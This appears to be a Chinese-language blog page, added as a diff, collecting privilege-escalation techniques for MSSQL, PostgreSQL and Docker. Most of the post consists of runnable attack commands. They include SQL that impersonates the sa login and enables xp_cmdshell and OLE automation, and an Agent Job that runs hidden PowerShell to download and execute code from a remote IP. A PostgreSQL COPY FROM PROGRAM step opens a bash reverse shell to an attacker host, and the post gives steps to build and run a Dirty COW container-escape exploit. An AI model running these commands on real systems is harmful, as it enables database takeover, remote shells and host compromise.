@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="权限提升MSSQL模拟登录提权至sa用sa用户创建四个普通用户  这时候随便选一个新建用户登录是没有权限查看只有sa能查看的数据库的  查询所有的用户名如下 1SELECT * from master.sys.sysusers where islogin&#x3D;&#39;1&#39;  islogin&#x3D;’1’表示帐户islogin&#x3D;’0’表示角色status&#x3D;’2’表示用户帐户status&#x3D;’">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限提升&#x2F;权限提升">
+<meta property="og:url" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/index.html">
+<meta property="og:site_name" content="xdcty">
+<meta property="og:description" content="权限提升MSSQL模拟登录提权至sa用sa用户创建四个普通用户  这时候随便选一个新建用户登录是没有权限查看只有sa能查看的数据库的  查询所有的用户名如下 1SELECT * from master.sys.sysusers where islogin&#x3D;&#39;1&#39;  islogin&#x3D;’1’表示帐户islogin&#x3D;’0’表示角色status&#x3D;’2’表示用户帐户status&#x3D;’">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/assets/image-20201227004214405.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/assets/image-20201227004908644.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/assets/image-20201227005713451.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/assets/image-20201227010245788.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/assets/image-20201227011301818.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/assets/image-20201227011437835.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/assets/image-20201227011629720.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/assets/image-20201227011800437.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/assets/image-20201227013714049.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/assets/image-20201228220740323.png">
+<meta property="article:published_time" content="2021-02-20T16:59:52.887Z">
+<meta property="article:modified_time" content="2021-02-20T16:57:28.735Z">
+<meta property="article:author" content="cty">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/assets/image-20201227004214405.png">
+
+<link rel="canonical" href="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>权限提升/权限提升 | xdcty</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">xdcty</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">whoami</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="cty">
+      <meta itemprop="description" content="whoami">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xdcty">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          权限提升/权限提升
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-02-21 00:59:52 / 修改时间：00:57:28" itemprop="dateCreated datePublished" datetime="2021-02-21T00:59:52+08:00">2021-02-21</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1><span id="权限提升">权限提升</span></h1><h2><span id="mssql">MSSQL</span></h2><h3><span id="模拟登录提权至sa">模拟登录提权至sa</span></h3><p>用sa用户创建四个普通用户</p>
+<p><img src="assets/image-20201227004214405.png" alt="image-20201227004214405"></p>
+<p>这时候随便选一个新建用户登录是没有权限查看只有sa能查看的数据库的</p>
+<p><img src="assets/image-20201227004908644.png" alt="image-20201227004908644"></p>
+<p>查询所有的用户名如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from master.sys.sysusers where islogin&#x3D;&#39;1&#39;</span><br></pre></td></tr></table></figure>
+
+<p>islogin=’1’表示帐户<br>islogin=’0’表示角色<br>status=’2’表示用户帐户<br>status=’0’表示糸统帐户</p>
+<p>即只能看到四个系统账户</p>
+<p><img src="assets/image-20201227005713451.png" alt="image-20201227005713451"></p>
+<p>赋予MyUser1用户权限来模拟sa</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">USE master;</span><br><span class="line">GRANT IMPERSONATE ON LOGIN::sa to [MyUser1];</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+
+<p>这里的GRANT IMPERSONATE ON LOGIN意思是授权MyUser1用户对sa用户登录权限(只有在当前数据库为 master 时，才可授予其服务器作用域内的权限。)</p>
+<p><img src="assets/image-20201227010245788.png" alt="image-20201227010245788"></p>
+<p>已经对MyUser1用户授权sa权限后，我们再登录该低权用户</p>
+<p>查看哪些用户能够模拟登录，发现了sa</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT distinct b.name</span><br><span class="line">FROM sys.server_permissions a</span><br><span class="line">INNER JOIN sys.server_principals b</span><br><span class="line">ON a.grantor_principal_id &#x3D; b.principal_id</span><br><span class="line">WHERE a.permission_name &#x3D; &#39;IMPERSONATE&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="assets/image-20201227011301818.png" alt="image-20201227011301818"></p>
+<p>查看模拟登录前权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT SYSTEM_USER</span><br><span class="line">SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="assets/image-20201227011437835.png" alt="image-20201227011437835"></p>
+<p>模拟登录后查看权限变成sa</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE AS LOGIN &#x3D; &#39;sa&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="assets/image-20201227011629720.png" alt="image-20201227011629720"></p>
+<p>再执行命令能看到8个系统账户了</p>
+<p><img src="assets/image-20201227011800437.png" alt="image-20201227011800437"></p>
+<p>查询是否是库权限以及是否有库读取权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Select IS_MEMBER(&#39;db_owner&#39;);</span><br><span class="line">Select HAS_DBACCESS(&#39;master&#39;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="assets/image-20201227013714049.png" alt="image-20201227013714049"></p>
+<h3><span id="mssql执行系统命令">mssql执行系统命令</span></h3><h4><span id="启用xp_cmdshell">启用xp_cmdshell</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#39;show advanced options&#39;,1</span><br><span class="line"></span><br><span class="line">reconfigure</span><br><span class="line"></span><br><span class="line">go</span><br><span class="line"></span><br><span class="line">sp_configure &#39;xp_cmdshell&#39;,1</span><br><span class="line"></span><br><span class="line">reconfigure</span><br><span class="line"></span><br><span class="line">go</span><br><span class="line"></span><br><span class="line">exec master..xp_cmdshell &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<h4><span id="启用sp_oacreate">启用SP_OACreate</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell 删除以后，可以使用SP_OACreate。</span><br><span class="line"></span><br><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1;  </span><br><span class="line"></span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br><span class="line"></span><br><span class="line">EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;  </span><br><span class="line"></span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br><span class="line"></span><br><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 0;</span><br><span class="line"></span><br><span class="line">执行[此方法无回显]</span><br><span class="line"></span><br><span class="line">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe &#x2F;c whoami &gt;d:\\temp\\1.txt&#39;</span><br></pre></td></tr></table></figure>
+
+<h4><span id="通过沙盒执行命令">通过沙盒执行命令</span></h4><p>开启沙盒</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,1</span><br></pre></td></tr></table></figure>
+
+<p>利用jet.oledb执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39;,&#39;;database&#x3D;c:\windows\system32\ias\dnary.mdb&#39;,&#39;select shell(&quot;whoami&quot;)&#39;)select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39;,&#39;;database&#x3D;ias\ias.mdb&#39;,&#39;select shell(&quot;CMD命令&quot;)&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>但是,当 c:\Windows\System32\ias\dnary.mdb 或 c:\Windows\System32\ias\ias.mdb 被删除时,命令就会无效了.所以利用以下语句创建一个数据库：(数据库名SysSetup.xml,后缀.xml是自定义,不影响使用.)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">declare @hr int</span><br><span class="line"></span><br><span class="line">declare @object int;declare @property int</span><br><span class="line"></span><br><span class="line">exec @hr &#x3D; sp_OACreate &#39;ADOX.Catalog&#39;,@object OUTPUT</span><br><span class="line"></span><br><span class="line">exec @hr &#x3D; sp_OAMethod @object,&#39;Create&#39;,@property output,&#39;Provider&#x3D;Microsoft.Jet.OLEDB.4.0;Data Source&#x3D;SysSetup.xml&#39;</span><br><span class="line"></span><br><span class="line">然后再利用jet.oledb调用SysSetup.xml执行系统命令：</span><br><span class="line"></span><br><span class="line">select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39;,&#39;;database&#x3D;SysSetup.xml&#39;,&#39;select shell(&quot;CMD命令&quot;)&#39;)</span><br></pre></td></tr></table></figure>
+
+<h4><span id="通过agent-job执行命令">通过Agent Job执行命令</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">USE msdb; EXEC dbo.sp_add_job @job_name &#x3D; N&#39;test_powershell_job1&#39; ; </span><br><span class="line"></span><br><span class="line">EXEC sp_add_jobstep @job_name &#x3D; N&#39;test_powershell_job1&#39;, </span><br><span class="line"></span><br><span class="line">@step_name &#x3D; N&#39;test_powershell_name1&#39;, @subsystem &#x3D; N&#39;PowerShell&#39;, @command &#x3D; N&#39;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http:&#x2F;&#x2F;192.168.214.129:80&#x2F;a&#39;&#39;))&quot;&#39;, @retry_attempts &#x3D; 1, @retry_interval &#x3D; 5 ;EXEC dbo.sp_add_jobserver @job_name &#x3D; N&#39;test_powershell_job1&#39;; EXEC dbo.sp_start_job N&#39;test_powershell_job1&#39;;</span><br></pre></td></tr></table></figure>
+
+<h2><span id="postgresql">postgresql</span></h2><h3><span id="cve-2019-9193实例代码执行漏洞">CVE-2019-9193实例代码执行漏洞</span></h3><p>从9.3版本开始，Postgres新增了一个COPY TO/FROM PROGRAM功能，允许数据库的超级用户以及pg_read_server_files组中的任何用户执行操作系统命令,并且并不觉得这是个漏洞，以至于后续一直没改</p>
+<p>`</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 删除并创建用于保存系统命令执行结果的表&#96; </span><br><span class="line"></span><br><span class="line"> &#96;DROP TABLE IF EXISTS cmd_exec;&#96; </span><br><span class="line"></span><br><span class="line">&#96;CREATE TABLE cmd_exec(cmd_output text);&#96;</span><br><span class="line"></span><br><span class="line">&#96;#命令执行测试，多试几条 COPY cmd_exec FROM PROGRAM &#39;id&#39;;&#96; </span><br><span class="line"></span><br><span class="line">&#96;COPY cmd_exec FROM PROGRAM &#39;whoami&#39;;&#96; </span><br><span class="line"></span><br><span class="line">&#96;#查看结果&#96; </span><br><span class="line"></span><br><span class="line">&#96;SELECT * FROM cmd_exec;</span><br></pre></td></tr></table></figure>
+
+<p>执行后Windows下一般是获取到network services权限，Linux下一般是获得postgresql权限</p>
+<p><img src="assets/image-20201228220740323.png" alt="image-20201228220740323"></p>
+<p>反弹出网</p>
+<p>attack机器上开启监听</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>
+
+<p>利用pg执行远程连接命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COPY cmd_exec FROM PROGRAM 'bash -i &gt;&amp; /dev/tcp/attack_ip/8888 0&gt;&amp;1';</span><br></pre></td></tr></table></figure>
+
+
+
+<h2><span id="docker">docker</span></h2><h3><span id="脏牛漏洞cve-2016-5195引起的逃逸">脏牛漏洞CVE-2016-5195引起的逃逸</span></h3><p>Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。</p>
+<p>竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得root权限。VDSO就是Virtual Dynamic Shared Object（虚拟动态共享对象），即内核提供的虚拟.so。该.so文件位于内核而非磁盘，程序启动时，内核把包含某.so的内存页映射入其内存空间，对应程序就可作为普通.so使用其中的函数。</p>
+<p>在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。</p>
+<p><strong>漏洞前提:宿主机存在脏牛漏洞</strong></p>
+<p>利用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/scumjr/dirtycow-vdso.git</span><br><span class="line">cd /dirtycow-vdso/</span><br><span class="line">make</span><br><span class="line">./0xdeadbeef #反弹shell到本地主机</span><br><span class="line">./0xdeadbeef ip:port #反弹shell到指定主机的指定端口</span><br></pre></td></tr></table></figure>
+
+<h3><span id="cve-2020-15257利用containerd-shim-api逃逸">CVE-2020-15257利用containerd-shim API逃逸</span></h3><p>containerd是行业标准的容器运行时（Containerd 是一个工业级标准的容器运行组建，docker对容器的管理和操作基本基于Containered来完成），可作为Linux和Windows的守护程序使用。容器填充的API不正确地暴露给主机网络容器。<strong>在 host 模式下，容器与 host 共享一套 Network namespaces ，此时 containerd-shim API 暴露给了用户。containerd 在操作 runC</strong>（Docker、containerd针对容器的运行相关操作，最终将落实到runc上来实现）时，<strong>会创建相应进程并生成一个抽象 socket，docker 通过该 socket 与容器进行控制与通信。该 socket 可以在宿主机的 /proc/net/unix 文件中查找到，当 Docker 容器内部共享了宿主机的网络时，便可通过加载该 socket，来控制 Docker 容器，引发逃逸。</strong></p>
+<p>注：namespace 是Linux 内核用来隔离内核资源的方式。其主要有Cgroup、IPC、Network、Mount、PID、User、UTS 七种</p>
+<p>总之，当攻击者在host模式且有漏洞的容器内，提权至root后，可以通过</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`cat /proc/net/unix | grep 'containerd-shim' | grep '@'</span><br></pre></td></tr></table></figure>
+
+<p>`获取宿主机containerd-shim监听的Unix域套接字，并连接它来调用containerd-shim提供的API，进而逃逸容器</p>
+<p>影响版本</p>
+<p>containerd &lt; 1.4.3<br>containerd &lt; 1.3.9</p>
+<p>安全版本</p>
+<p>containerd &gt;= 1.4.3<br>containerd &gt;= 1.3.9</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/02/21/%E5%90%88%E4%BC%97%E8%A7%86%E9%A2%91%E8%BE%B9%E7%95%8C%E7%BD%91%E5%85%B3/%E5%90%88%E4%BC%97%E8%A7%86%E9%A2%91%E5%AE%89%E5%85%A8%E4%BA%A4%E6%8D%A2%E6%8E%A5%E5%85%A5%E7%B3%BB%E7%BB%9FRCE/" rel="prev" title="合众视频边界网关/合众视频安全交换接入系统RCE">
+      <i class="fa fa-chevron-left"></i> 合众视频边界网关/合众视频安全交换接入系统RCE
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">1.1.</span> <span class="nav-text">MSSQL</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">1.1.1.</span> <span class="nav-text">模拟登录提权至sa</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">1.1.2.</span> <span class="nav-text">mssql执行系统命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">启用xp_cmdshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">启用SP_OACreate</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">通过沙盒执行命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.1.2.4.</span> <span class="nav-text">通过Agent Job执行命令</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">1.2.</span> <span class="nav-text">postgresql</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">1.2.1.</span> <span class="nav-text">CVE-2019-9193实例代码执行漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">1.3.</span> <span class="nav-text">docker</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">1.3.1.</span> <span class="nav-text">脏牛漏洞CVE-2016-5195引起的逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">1.3.2.</span> <span class="nav-text">CVE-2020-15257利用containerd-shim API逃逸</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">cty</p>
+  <div class="site-description" itemprop="description">whoami</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cty</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">chenfan</a> 强力驱动 v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.2
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</body>
+</html>
